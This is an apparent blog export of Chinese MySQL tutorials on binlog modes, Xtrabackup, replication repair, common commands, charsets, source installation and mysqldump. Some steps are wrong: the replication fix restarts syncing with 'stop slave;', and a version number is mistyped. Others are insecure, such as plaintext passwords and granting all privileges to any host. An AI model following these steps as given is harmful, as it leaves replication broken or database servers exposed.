    <content type="text"><![CDATA[Mysql binlog 日志的三种模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Row Level：日志中会记录成每一行数据被修改的形式，然后在slave端再对相同的数据进行修改。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优点：在row level模式下，bin-log中可以不记录执行的sql语句的上下文相关的信息，仅仅只需要记录那一条记录被修改了，修改成什么样了。所以row level的日志内容会非常清楚的记录下每一行数据修 改的细节，非常容易理解。而且不会出现某些特定情况下的存储过程，或function，以及 trigger的调 用和触发无法被正确复制的问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缺点：row level下，所有的执行的语句当记录到日志中的时候，都将以每行记录的修改来记录，这样可能会产生大量的日志内容，比如有这样一条update语句：update product set owner_member_id = ‘b’ where owner_member_id = ‘a’，执行之后，日志中记录的不是这条update语句所对应额事件(MySQL以事件的形式来记录bin-log日志)，而是这条语句所更新的每一条记录的变化情况，这样就记 录成很多条记录被更新的很多个事件。自然，bin-log日志的量就会很大。尤其是当执行alter table之类的语句的时候，产生的日志量是惊人的。因为MySQL对于alter table之类的表结构变更语句的处理 方式是整个表的每一条记录都需要变动，实际上就是重建了整个表。那么该表的每一条记录都会被记 录到日志中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Statement Level:每一条会修改数据的sql都会记录到 master的bin-log中。slave在复制的时候sql进程会解析成和原来master端执行过的相同的sql来再次执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优点：statement level下的优点首先就是解决了row level下的缺点，不需要记录每一行数据的变化，减少bin-log日志量，节约IO，提高性能。因为他只需要记录在Master上所执行的语句的细节，以及执行语句时候的上下文的信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缺点：由于他是记录的执行语句，所以，为了让这些语句在slave端也能正确执行，那么他还必须记录每条语句在执行的时候的一些相关信息，也就是上下文信息，以保证所有语句在slave端杯执行的时候能够得到和在master端执行时候相同的结果。另外就是，由于MySQL现在发展比较快，很多的新功能不断的加入，使MySQL得复制遇到了不小的挑战，自然复制的时候涉及到越复杂的内容，bug也就越容易出现。在statement level下，目前已经发现的就有不少情况会造成MySQL的复制出现问题，主要是修改数据的时候使用了某些特定的函数或者功能的时候会出现，比如：sleep()函数在有些版本中就不能真确复制，在存储过程中使用了last_insert_id()函数，可能会使slave和master上得到不一致的id等等。由于row level是基于每一行来记录的变化，所以不会出现类似的问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Mixed，实际上就是前两种模式的结合。在Mixed模式下，MySQL会根据执行的每一条具体的sql语句来区分对待记录的日志形式，也就是在Statement和Row之间选择一种。新版本中的Statment level还是和以前一样，仅仅记录执行的语句。而新版本的MySQL中队row level模式也被做了优化，并不是所有的修改都会以row level来记录，像遇到表结构变更的时候就会以statement模式来记录，如果sql语句确实就是update或者delete等修改数据的语句，那么还是会记录所有行的变更。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在配置文件中参数如下： 1234log-bin=mysql-bin#binlog_format=”STATEMENT”#binlog_format=”ROW”binlog_format=”MIXED” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;运行时在线修改： 123456mysql&gt; SET SESSION binlog_format = ‘STATEMENT’;mysql&gt; SET SESSION binlog_format = ‘ROW’;mysql&gt; SET SESSION binlog_format = ‘MIXED’;mysql&gt; SET GLOBAL binlog_format = ‘STATEMENT’;mysql&gt; SET GLOBAL binlog_format = ‘ROW’;mysql&gt; SET GLOBAL binlog_format = ‘MIXED’;]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[innobackupex 备份 Xtrabackup 增量备份]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F18.%20innobackupex%20%E5%A4%87%E4%BB%BD%20Xtrabackup%20%E5%A2%9E%E9%87%8F%E5%A4%87%E4%BB%BD%2F</url>
    <content type="text"><![CDATA[innobackupex 备份 Xtrabackup 增量备份&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Xtrabackup中包含两个工具： xtrabackup - 用于热备份innodb, xtradb表的工具，不能备份其他表(MYISAM表)。 innobackupex - 对xtrabackup封装的perl脚本，提供了myisam表备份的能力。（能进行整库和数据表备份）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：备份恢复之前请做好全库备份 安装Xtrabackup&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;官网网址 安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置文件中需要添加 datadir = /usr/local/mysql/datadir ，MYSQL数据文件目录 1.自动安装yum源后，用yum安装1234yum install -y gnupgrpm -Uhv http://www.percona.com/downloads/percona-release/percona-release-0.0-1.x86_64.rpm yum install -y percona-xtrabackup 2.手动写入yum源&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;新建文件 /etc/yum.repos.d/Percona.repo 123456[percona]name = CentOS $releasever - Perconabaseurl=http://repo.percona.com/centos/$releasever/os/$basearch/enabled = 1gpgkey = file:///etc/pki/rpm-gpg/RPM-GPG-KEY-perconagpgcheck = 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之后yum安装 ，安装后可执行 xtrabackup -v 查看 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之后可以用xtrabackup 备份 innobackupex 备份全库&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备份主程序为 /usr/bin/innobackupex-1.5.1，其需要从 mysql 配置文件中读取相关信息，Mysql缺省配置文件 my.cnf 中未配置 datadir 选项，必须显性添加，否则备份程序会报错： 11innobackupex:: Warning: Ignored unrecognized line 2 in options : 'xtrabackup: Error: Please set parameter 'datadir' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Mysql 配置文件 /etc/my.cnf 配置文件添加 datadir 内容： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在[mysqld]段加入 1datadir = /usr/local/mysql/var 1.备份1#/usr/bin/innobackupex-1.5.1 --user=root --password=password --defaults-file=/etc/my.cnf /usr/local/bbsBackup 2.恢复1234/usr/bin/innobackupex-1.5.1 --apply-log /usr/local/bbsBackup/2011-09-26_02-00-01//usr/bin/innobackupex-1.5.1 --copy-back /usr/local/bbsBackup/2011-09-26_02-00-01/chown -R mysql:mysql /usr/local/mysql//etc/init.d/mysqld start 全量备份及恢复&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：使用xtrabackup，仅限InnoDB和xtradb表，且注意mysql配置文件my.cnf中需设置“default_table_type = InnoDB”否则不成功 1/usr/bin/xtrabackup --defaults-file=/etc/my.cnf --backup --target-dir=/usr/local/bbsBackup/base/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;恢复时执行两次： 12/usr/bin/xtrabackup --defaults-file=/etc/my.cnf --prepare --target-dir=/usr/local/bbsBackup/base/usr/bin/xtrabackup --defaults-file=/etc/my.cnf --prepare --target-dir=/usr/local/bbsBackup/base 1234567#将数据库停掉/etc/init.d/mysqld stop#删除数据库目录下的ib*（ib开头的所有）文件。rm /usr/local/mysql/var/ib*#将/usr/local/bbsBackup/base目录下的ib*文件拷贝到数据库目录。cd /usr/local/mysql/var/cp /usr/local/bbsBackup/base/ib* ./ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置权限： 1chown mysql:mysql ib* &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启数据库后测试，是否成功。 增量备份及恢复&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：做增量前当然要先进行全量备份，在全量的基础上来进行增量。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先进行全量备份。 1/usr/bin/xtrabackup --defaults-file=/etc/my.cnf --backup --target-dir=/usr/local/bbsBackup/base/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在全量备份的基础上进行增量。 1/usr/bin/xtrabackup --defaults-file=/etc/my.cnf --backup --target-dir=/usr/local/bbsBackup/1 --incremental-basedir=/usr/local/bbsBackup/base/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：/usr/local/bbsBackup/1是每次都需修改的。比如第二次增量就改成/usr/local/bbsBackup/2增量恢复。（步骤同全量恢复，只是在执行恢复命令的时候中间多一步） 123/usr/bin/xtrabackup --defaults-file=/etc/my.cnf --prepare --target-dir=/usr/local/bbsBackup/base/usr/bin/xtrabackup --target-dir=/usr/local/bbsBackup/base --prepare --incremental-dir=/usr/local/bbsBackup/1/usr/bin/xtrabackup --defaults-file=/etc/my.cnf --prepare --target-dir=/usr/local/bbsBackup/base 1234567#将数据库停掉/etc/init.d/mysqld stop#删除数据库目录下的ib*（ib开头的所有）文件。rm /usr/local/mysql/var/ib*#将/usr/local/bbsBackup/base目录下的ib*文件拷贝到数据库目录。cd /usr/local/mysql/var/cp /usr/local/bbsBackup/base/ib* ./ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置权限： 1chown mysql:mysql ib* &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启数据库后测试，是否成功。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql主从数据库不同步的2种解决方法]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F33.%20mysql%E4%B8%BB%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8D%E5%90%8C%E6%AD%A5%E7%9A%842%E7%A7%8D%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[mysql主从数据库不同步的2种解决方法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;发现Mysql的主从数据库没有同步 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先上Master库： 1mysql&gt;show processlist; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看下进程是否Sleep太多。发现很正常。 1show master status; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也正常。 1234567mysql&gt; show master status; +-------------------+----------+--------------+-------------------------------+ | File | Position | Binlog_Do_DB | Binlog_Ignore_DB | +-------------------+----------+--------------+-------------------------------+ | mysqld-bin.000001 | 3260 | | mysql,test,information_schema | +-------------------+----------+--------------+-------------------------------+ 1 row in set (0.00 sec) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再到Slave上查看 123mysql&gt; show slave status\G;Slave_IO_Running: Yes Slave_SQL_Running: No &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可见是Slave不同步 下面介绍两种解决方法：方法一：忽略错误后，继续同步&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该方法适用于主从库数据相差不大，或者要求数据可以不完全统一的情况，数据要求不严格的情况 1234stop slave; #表示跳过一步错误，后面的数字可变 set global sql_slave_skip_counter =1; start slave; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之后再用 1mysql&gt; show slave status\G; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看： 12Slave_IO_Running: Yes Slave_SQL_Running: Yes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ok，现在主从同步状态正常了。。。 方式二：重新做主从，完全同步&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该方法适用于主从库数据相差较大，或者要求数据完全统一的情况 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决步骤如下： 先进入主库，进行锁表，防止数据写入 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用命令： 1mysql&gt; flush tables with read lock; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：该处是锁定为只读状态，语句不区分大小写 进行数据备份 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把数据备份到mysql.bak.sql文件 1[root@server01 mysql]#mysqldump -uroot -p -hlocalhost &gt; mysql.bak.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里注意一点：数据库备份一定要定期进行，可以用shell脚本或者python脚本，都比较方便，确保数据万无一失 查看master 状态 1234567mysql&gt; show master status; +-------------------+----------+--------------+-------------------------------+ | File | Position | Binlog_Do_DB | Binlog_Ignore_DB | +-------------------+----------+--------------+-------------------------------+ | mysqld-bin.000001 | 3260 | | mysql,test,information_schema | +-------------------+----------+--------------+-------------------------------+ 1 row in set (0.00 sec) 把mysql备份文件传到从库机器，进行数据恢复 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用scp命令 1[root@server01 mysql]# scp mysql.bak.sql root@192.168.128.101:/tmp/ 停止从库的状态 1mysql&gt; stop slave; 然后到从库执行mysql命令，导入数据备份 1mysql&gt; source /tmp/mysql.bak.sql 设置从库同步，注意该处的同步点，就是主库show master status信息里的| File| Position两项 1change master to master_host = '192.168.128.100', master_user = 'rsync', master_port=3306, master_password='', master_log_file = 'mysqld-bin.000001', master_log_pos=3260; 重新开启从同步 1mysql&gt; stop slave; 查看同步状态 123mysql&gt; show slave status\G; Slave_IO_Running: Yes Slave_SQL_Running: Yes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;好了，同步完成啦。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql常用操作]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F13.%20mysql%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[mysql常用操作&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有一个图形管理mysql的工具叫phpmyadmin，而如何在命令行下面来管理和操作mysql。 查看都有那些库1mysql&gt; show databases; 查看某个库的表12mysql&gt; use mysql;mysql&gt; show tables; 查看表的字段1mysql&gt; desc pre_ucenter_vars; 查看建表的语句1mysql&gt; show create table pre_ucenter_vars\G; 当前是哪个用户1mysql&gt; select user(); 查看当前库1mysql&gt; select database(); 创建库1mysql&gt; create database yanyi; 创建表1mysql&gt; create table tb1 (`id` int(4), `name` char(40)) ENGINE=MyISAM DEFAULT CHARSET=gbk; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tb1 是表名；第一个字段是 id,格式是 int ，长度 4位；第二个字段 name 格式是 char 长度 40；指定 ENGINE 为 MyISAM ；字符集 DEFAULT CHARSET 为 gbk。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建完成后查看 插入数据1mysql&gt; insert into tb1 values (1,'yanyi'); &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还可以继续插入 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以只插入一个字段 1mysql&gt; insert into tb1 (`id`) values (2); 1mysql&gt; insert into tb1 (`name`) values ('docker'); 1mysql&gt; insert into tb1 (`name`,`id`) values ('redis',6); 查看数据库版本1mysql&gt; select version(); 查看 mysql 状态1mysql&gt; show status; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以用 like 过滤，% 通配 1mysql&gt; show status like '%running'; 1mysql&gt; show status like '%buffer%'; 修改 mysql 参数 12mysql&gt; set global max_connections=200;mysql&gt; show variables like 'max_connections'; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果记不住也可以用 % 通配 1mysql&gt; show variables like 'max_connec%'; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不过这些方法，重启就会变回以前配置，要永久生效需更改 /etc/my.cnf 查看 mysql 队列1mysql&gt; show processlist; 查看 mysql 变量1mysql&gt; show variables; 创建普通用户并授权12345mysql&gt; grant all on *.* to user1 identified by '123456';mysql&gt; grant all on discuz.* to 'user2'@'192.168.0.%' identified by '123456'；mysql&gt; grant all on discuz.* to 'user3'@'%' identifined by '123456'; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;all 代表所有权限；.代表所有库里的所有表，discuz.*代表 discuz 库里的所有表；to 后边是用户名；@ 后边是客户端 ip ，192.168.0.%代表整个网段，% 代表通配，直接用 % 代替 ip 就表示所有网段；identfied by 后边是密码。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户创建完以后还没有即时生效，需要刷新下权限命令如下 1mysql&gt; flush privileges; 更改密码1mysql&gt; update mysql.user set password=password("newpwd") where user='username'; 查询1mysql&gt; select count(*) from mysql.user; 1mysql&gt; select * from mysql.db;select * from mysql.db where host like '10.0.%'\G; 插入1mysql&gt; update tb1 set id=5 where name = 'docker'; 清空表1mysql&gt; truncate table yanyi.tb1; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;yanyi是库名，tb1是表名，清空以后表还在。 删除表1mysql&gt; delete from tb1 where name='redis' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是删除表中指定的行 1mysql&gt; drop table tb1; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是删除整个表 删除数据库1mysql&gt; drop database yanyi; 修复表1mysql&gt; repair table discuz.pre_forum_post; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上就是一些常用的 mysql相关操作。还有个知识点，在 shell 的命令下去执行 mysql 的操作 1[root@lamp ~]# mysql -uroot -pyanyi mysql -e "show tables" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-e 前面的 mysql 指的是库的名字， -e 选项后面双引号括起来的就是 mysql 的命令。 授权超级用户1grant all privileges on *.* to 'tangnanbing'@'%' identified by '1qaz@WSX' with grant option;]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL—什么是事物？事物的特性有哪些？]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F14.%20SQL%E2%80%94%E4%BB%80%E4%B9%88%E6%98%AF%E4%BA%8B%E7%89%A9%EF%BC%9F%E4%BA%8B%E7%89%A9%E7%9A%84%E7%89%B9%E6%80%A7%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[SQL—什么是事物？事物的特性有哪些？概念&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;事务(Transaction)是访问并可能更新数据库中各种数据项的一个程序执行单元(unit)。事务通常由高级数据库操纵语言或编程语言（如SQL，C++或Java）书写的用户程序的执行所引起，并用形如begin transaction和end transaction语句（或函数调用）来界定。事务由事务开始(begin transaction)和事务结束(end transaction)之间执行的全体操作组成。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如：在关系数据库中，一个事务可以是一条SQL语句，一组SQL语句或整个程序。 特性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;事务是恢复和并发控制的基本单位。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;事务应该具有4个属性：原子性、一致性、隔离性、持续性。这四个属性通常称为ACID特性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;原子性（atomicity）。一个事务是一个不可分割的工作单位，事务中包括的操作要么都做，要么都不做。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一致性（consistency）。事务必须是使数据库从一个一致性状态变到另一个一致性状态。一致性与原子性是密切相关的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;隔离性（isolation）。一个事务的执行不能被其他事务干扰。即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;持久性（durability）。持续性也称永久性（permanence），指一个事务一旦提交，它对数据库中数据的改变就应该是永久性的。接下来的其他操作或故障不应该对其有任何影响。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql字符集调整总结]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F20.mysql%E5%AD%97%E7%AC%A6%E9%9B%86%E8%B0%83%E6%95%B4%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[mysql字符集调整总结&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;字符集是一套符号和编码的规则，不论是在oracle数据库还是在mysql数据库，都存在字符集的选择问题。对于数据库来说，字符集又是比较重要的，因为数据库存储的数据大部分都是各种文字，字符集对于数据库的存储、处理性能以及数据迁移都有重要的影响。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果在数据库创建阶段没有正确选择字符集，那么可能在后期需要更换字符集，而字符集的更换是代价比较高的操作，也存在一定的风险，所以我们建议在应用开始阶段，就按照需求正确的选择合适的字符集，尽量避免后期不必要的调整。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql编译安装时，指定字符集的方法： 1./configure --with-charset=utf8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql的字符集有4个级别的默认设置：服务器级、数据库级、表级和字段级。分别在不同的地方设置，作用也不相同。 1、服务器字符集设定，在mysql服务启动的时候确定。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以在my.cnf中设置： 12345678[mysql]### 默认字符集为utf8default-character-set=utf8[mysqld]### 默认字符集为utf8default-character-set=utf8### （设定连接mysql数据库时使用utf8编码，以让mysql数据库为utf8运行）init_connect='SET NAMES utf8' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者在启动选项中指定： 1mysqld --default-character-set=utf8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果没有特别的指定服务器字符集，默认使用latin1(ISO-8859-1的别名)作为服务器字符集。上面三种设置的方式都只指定了字符集，没有去做校对，我们可以用show variables like ‘char%’;命令查询当前服务器的字符集和校对规则。 123456789101112131415161718192021222324mysql&gt;show variables like 'char%'; +--------------------------+----------------------------+ | Variable_name | Value | +--------------------------+----------------------------+ | character_set_client | utf8 | | character_set_connection | utf8 | | character_set_database | utf8 | | character_set_filesystem | binary | | character_set_results | utf8 | | character_set_server | utf8 | | character_set_system | utf8 | | character_sets_dir | /usr/share/mysql/charsets/ | +--------------------------+----------------------------+ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：如果增加default-character-set=utf8后，MYSQL启动报错。可以用character_set_server=utf8来取代default-character-set=utf8，就能正常启动了。这是因为MYSQL不同版本识别的问题。 2、数据库级&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建数据库时指定字符集 1mysql&gt;CREATE DATABASE my_db default charset utf8 COLLATE utf8_general_ci; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意后面这句话 “COLLATE utf8_general_ci”,大致意思是在排序时根据utf8编码格式来排序如果指定了数据库编码，那么在这个数据库下创建的所有数据表的默认字符集都会是utf8了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改MYSQL数据库编码，如果是MYSQL数据库编码不正确，可以在MYSQL执行如下命令: 1ALTER DATABASE my_db DEFAULT CHARACTER SET utf8; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上命令就是将MYSQL的my_db数据库的编码设为utf8 3、表级&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建表时指定字符集 1mysql&gt;create table my_table (name varchar(20) not null default '')type=myisam default charset utf8; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这句话就是创建一个表,指定默认字符集为utf8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改MYSQL表的编码： 1ALTER TABLE my_table DEFAULT CHARACTER SET utf8; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上命令就是将一个表my_table的编码改为utf8 4、字段级1alter table test add column address varchar(110) after stu_id; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在stu_id后增加一个字段address 1alter table test add id int unsigned not Null auto_increment primary key; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改字段的编码： 1ALTER TABLE `test` CHANGE `name` `name` VARCHAR( 45 ) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上命令就是将MYSQL数据库test表中name的字段编码改为utf8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在命令行下插入汉字时如下代码： 12set names utf8;有时候这一句很关键！insert into charset values('王达'); &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：alter修改的方法不能更新已有记录的字符集，只是对新创建的表和记录生效。对已有记录字符集的调整，需要先将数据导出，经过适当调整后重新导入才可以完全修改编码。 导出导入的字符调整方法导出表结构1mysqldump -uroot -pmysql --default-character-set=latin1 -d my_db&gt; createtab.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;手工修改createtab.sql表结构定义中的字符集为新的字符集 导出所有记录1mysqldump -uroot -pmysql --quick --no-create-info --extended-insert --default-character-set=latin1 --host=localhost my_db&gt; data.sql 打开data.sql，将set names latin1修改成set names utf81:%s/latin1/utf8/g &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;全文替换 使用新的字符集创建新的数据库1create database mydata default charset utf8; 创建表，执行createtab.sql1mysql -uroot -pmysql mydata&lt;creattab.sql 导入数据1mysql -uroot -pmysql mydata&lt;data.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意一点就是目标字符集要大于等于源字符集，否则会丢失一部分不支持的汉字数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;附：旧数据升级办法 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以原来的字符集为latin1为例，升级成为utf8的字符集。原来的表: old_table (default charset=latin1)，新表：new_table(default charset=utf8)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一步：导出旧数据 1mysqldump --default-character-set=latin1 -hlocalhost -uroot -B my_db --tables old_table &gt; old.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二步：转换编码 1iconv -t utf8 -f latin1 -c old.sql &gt; new.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这里，假定原来的数据默认是latin1编码。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第三步：导入 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改old.sql，增加一条sql语句： “SET NAMES utf8;”，保存。 1mysql -hlocalhost -uroot my_db &lt; new.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大功告成！ Mysql collate规则： *_bin: 表示的是binary case sensitive collation，也就是说是区分大小写的 *_cs: case sensitive collation，区分大小写 *_ci: case insensitive collation，不区分大小写]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL 5.5 源码安装]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F2.%20MySQL%205.5%20%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[MySQL 5.5 源码安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先安装必要的库 1yum install -y gcc* 首先安装cmake 支持yum安装 1yum install -y cmake 也可以源码安装 123456789cd /usr/local/src#下载cmakewget http://www.cmake.org/files/v2.8/cmake-2.8.7.tar.gztar zxvf cmake-2.8.7.tar.gzcd cmake-2.8.7#安装cmake./configuremakemake install 安装 MySQL&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;官网下载mysql5.5版本Linux系统源码包。 安装1234groupadd mysqluseradd -g mysql mysqltar zxvf mysql-5.2.25.tar.gzcd mysql-5.2.25 cmake：默认情况下安装，安装目录为/usr/local/mysql ，数据目录为/usr/local/mysql/data 也可以指定参数安装，如指定UTF8，数据引擎等 具体参照官方说明文档 1234567891011121314cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_DATADIR=/mysql/data -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DWITH_EXTRA_CHARSETS:STRING=all -DWITH_DEBUG=0 -DWITH_SSL=yes -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1make &amp;&amp; make installcd /usr/local/mysqlchown -R mysql:mysql /usr/local/mysql./scripts/mysql_install_db --user=mysql -datadir=/mysql/data#此处如不指定datadir，到启动时会报错chown -R root .chown -R mysql datacp support-files/my-medium.cnf /etc/my.cnfbin/mysqld_safe --user=mysql &amp;amp;# Next command is optionalcp support-files/mysql.server /etc/init.d/mysqldchmod +x /etc/init.d/mysqld/etc/init.d/mysqld start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到此，安装完成。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql备份与恢复]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F12.%20mysql%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D%2F</url>
    <content type="text"><![CDATA[mysql备份与恢复备份1[root@lamp ~]# mysqldump -uroot -pyanyi discuz &gt; /data/discuz.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：-p跟密码，中间不要有空格，后边的discuz是database名字，mysqldump出来的都是一些sql语句，所以用重定向符号 &gt; 给定向到一个文件中。 恢复1[root@lamp ~]# mysql -uroot -pyanyi discuz &lt; /data/discuz.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：这个过程正好和备份是相对的，反向重定向。 只备份一个表1[root@lamp ~]# mysqldump -uroot -pyanyi discuz pre_forum_post &gt; /data/post.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：discuz为数据库名字，pre_forum_post为表的名字，恢复不用加表名 1[root@lamp ~]# mysql -uroot -pyanyi discuz &lt; /data/post.sql 备份时指定字符集1[root@lamp ~]# mysqldump -uroot -pyanyi --default-character-set=gbk discuz pre_forum_post &gt; /data/post.sql 恢复也指定字符集1[root@lamp ~]# mysql -uroot -pyanyi --default-character-set=gbk discuz &lt; /data/post.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：指定字符集的目的是为了避免有的建表sql中并没有指定字符集，而直接使用mysql默认字符集的情况，这样就会造成乱码。]]></content>
